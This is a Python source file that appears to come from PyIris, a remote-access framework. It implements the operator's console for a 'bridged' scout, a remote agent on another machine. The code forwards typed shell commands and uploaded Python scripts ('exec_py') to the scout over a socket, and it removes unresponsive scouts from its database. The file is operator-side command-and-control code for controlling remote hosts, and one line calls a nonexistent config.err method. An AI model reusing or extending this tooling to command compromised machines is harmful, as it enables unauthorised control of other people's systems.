import command_interface.library.modules.prompt_arguement_gen as prompt_arguement_gen
import command_interface.library.commands.direct_interface.python_execute_editor as python_execute_editor
import socket

try:
    import readline
except ImportError:
    import gnureadline as readline


def main(pyiris):
    readline.parse_and_bind('tab: self-insert')
    try:
        scout_id = pyiris.config.bridged_to
        scout_prompt = pyiris.config.scout_database[scout_id]["host"] + ':' + pyiris.config.scout_database[scout_id]["port"]
        pyiris.log.pos('Bridged to : ' + scout_id)
    except (IndexError, KeyError):
        pyiris.log.err('Please enter a valid scout ID')
        pyiris.config.bridged_to = None
        return
    while True:
        try:
            prompt = input('\x1b[1m\x1b[37mPyIris (\x1b[0m\x1b[1m\x1b[31m' + 'Scout\x1b[0m' + '\x1b[1m\x1b[37m@\x1b[0m\x1b[1m\x1b[31m' + scout_prompt + '\x1b[0m\x1b[1m\x1b[37m) > \x1b[0m').strip()
            command = prompt.split(' ', 1)[0].lower()
            if command == 'back':
                pyiris.log.inf('Returning to scout interface...')
                pyiris.config.bridged_to = None
            elif command == 'clear':
                pyiris.global_functions.clear()
            elif command in ('!', 'local'):
                pyiris.global_functions.local(*prompt_arguement_gen.main(prompt=prompt, count=1))
            elif command == "main":
                pyiris.config.bridged_to = None
                return "home"
                pass
            elif command == "python":
                pyiris.global_functions.python()
            elif command == "quit":
                pyiris.global_functions.quit()
            elif command == 'exec_py_script':
                pyiris.direct.send("exec_py " + python_execute_editor.main(pyiris))
            elif not command:
                pass
            else:
                pyiris.direct.send(prompt)
        except KeyboardInterrupt:
            pyiris.global_functions.quit()
        except (socket.error, socket.timeout):
            try:
                pyiris.log.err('Scout is dead, removing from database...')
                currently_bridged = pyiris.config.bridged_to
                pyiris.config.bridged_to = None
                del (pyiris.config.scout_database[currently_bridged])
                pyiris.config.change = True
            except IndexError:
                pyiris.log.err('Scout does not exist in database!')
            return
        except IndexError:
            pyiris.config.err('Please supply valid arguments for the command you are running')
        if pyiris.config.bridged_to is None:
            return "scouts"